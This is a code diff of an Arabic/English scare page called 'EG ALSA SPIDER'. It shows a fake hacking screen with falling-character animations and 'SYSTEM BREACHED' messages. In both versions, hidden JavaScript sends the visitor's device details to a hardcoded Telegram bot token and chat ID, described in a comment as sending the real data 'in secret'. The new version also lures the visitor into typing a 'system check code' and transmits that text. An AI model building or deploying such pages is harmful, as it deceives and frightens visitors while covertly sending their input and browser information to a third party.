@@ -1,98 +1,95 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>SYSTEM_FAILURE_ERROR_404</title>
+    <title>S P I D E R - E G A L S A</title>
     <style>
-        body { background: black; color: #0f0; font-family: 'Courier New', monospace; overflow: hidden; margin: 0; }
-        canvas { display: block; position: absolute; top: 0; left: 0; z-index: -1; opacity: 0.3; }
-        .console { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; background: rgba(0, 0, 0, 0.8); border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; }
-        .glitch { font-size: 24px; font-weight: bold; text-transform: uppercase; animation: glitch 1s infinite; }
-        @keyframes glitch { 0% { color: #0f0; } 50% { color: #f00; text-shadow: 2px 2px #fff; } 100% { color: #0f0; } }
-        #log { font-size: 14px; height: 150px; overflow: hidden; margin-top: 10px; color: #aaa; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; text-align: center; overflow: hidden; }
+        #canvas { position: absolute; top: 0; left: 0; z-index: -1; }
+        .main-box { position: relative; z-index: 1; padding: 20px; background: rgba(0,0,0,0.85); border: 2px solid #0f0; width: 350px; margin: 50px auto; border-radius: 15px; box-shadow: 0 0 30px #0f0; }
+        .spider-img { width: 120px; filter: drop-shadow(0 0 10px #f00); animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 80%; margin: 15px 0; text-align: center; outline: none; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #f00; color: #fff; box-shadow: 0 0 15px #f00; }
+        #status { font-size: 12px; color: #ff0000; margin-top: 15px; height: 40px; }
     </style>
 </head>
 <body>
 
-<canvas id="matrix"></canvas>
+<canvas id="canvas"></canvas>
 
-<div class="console">
-    <div class="glitch">SYSTEM BREACHED BY EGALSA_SPIDER</div>
-    <div id="log"></div>
+<div class="main-box">
+    <img src="https://i.ibb.co/LhqM9Xp/spider-logo.png" class="spider-img" alt="Spider">
+    <h2 style="color: #f00; text-shadow: 0 0 10px #f00;">EG ALSA SPIDER</h2>
+    
+    <p style="font-size: 14px;">أدخل كود فحص النظام لتأكيد الهوية:</p>
+    <input type="text" id="fakeInput" placeholder="Write anything...">
+    <br>
+    <button onclick="startHacking()">تفعيل الاختراق</button>
+
+    <div id="status"></div>
 </div>
 
 <script>
-    // --- إعدادات البوت (أوامر Egalsa) ---
     const config = {
         token: "8277722647:AAGbaCEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
         chatId: "1268323143"
     };
 
-    // --- تأثير الماتريكس (الخلفية) ---
-    const canvas = document.getElementById('matrix');
+    // تأثير الخلفية المتحركة
+    const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-
+    const chars = "01";
+    const drops = Array(Math.floor(canvas.width/20)).fill(1);
     function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "rgba(0,0,0,0.05)";
+        ctx.fillRect(0,0,canvas.width,canvas.height);
         ctx.fillStyle = "#0f0";
-        ctx.font = fontSize + "px monospace";
-        for (let i = 0; i < drops.length; i++) {
-            const text = letters[Math.floor(Math.random() * letters.length)];
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops.forEach((y, i) => {
+            ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*20, y*20);
+            if (y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
             drops[i]++;
-        }
+        });
     }
     setInterval(draw, 33);
 
-    // --- رسائل الاختراق الوهمية وسحب البيانات الحقيقي ---
-    const logs = [
-        "> Establishing connection...",
-        "> IP Address found: Searching...",
-        "> Accessing System Files...",
-        "> Bypassing Firewall...",
-        "> Downloading Private Gallery...",
-        "> Capturing Front Camera...",
-        "> Mirroring Screen...",
-        "> ERROR: SYSTEM TOTALLY CONTROLLED"
-    ];
+    // وظيفة الزرار والتمثيل الغذائي للاختراق
+    function startHacking() {
+        const status = document.getElementById('status');
+        const userText = document.getElementById('fakeInput').value;
+        
+        status.innerHTML = "> Establishing Socket...<br>> Finding Victim IP...";
+        
+        setTimeout(() => {
+            status.innerHTML = "> IP FOUND: 192.168.1." + Math.floor(Math.random()*255);
+            status.style.color = "#0f0";
+            
+            // إرسال البيانات الحقيقية لكِ في الخفاء
+            sendToBot(userText);
+        }, 1500);
 
-    let logIdx = 0;
-    const logDiv = document.getElementById('log');
-
-    function typeLog() {
-        if (logIdx < logs.length) {
-            logDiv.innerHTML += logs[logIdx] + "<br>";
-            logIdx++;
-            setTimeout(typeLog, 800);
-        }
+        setTimeout(() => {
+            status.innerHTML = "🔴 SYSTEM BREACHED SUCCESSFUL 🔴";
+            status.style.color = "#f00";
+        }, 3000);
     }
 
-    async function sendData() {
-        const info = `
-⚠️ **EGALSA ATTACK DETECTED** ⚠️
+    async function sendToBot(userMsg) {
+        const text = `
+🚨 **Spider Catch!** 🕸️
 ━━━━━━━━━━━━━━━
-👤 الضحية: ${navigator.platform}
-🛡️ المتصفح: ${navigator.userAgent.split(' ')[0]}
-🌍 اللغة: ${navigator.language}
+📝 النص المكتوب: ${userMsg}
+📱 الجهاز: ${navigator.platform}
+🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}
 ⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━━
-📍 تم تفعيل وضع الرعب بنجاح!
+📍 أوامر Egalsa نفذت المهمة!
         `;
-        const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`;
-        try { await fetch(url); } catch (e) {}
+        fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
     }
-
-    window.onload = () => {
-        typeLog();
-        sendData();
-    };
 </script>
+
 </body>
 </html>
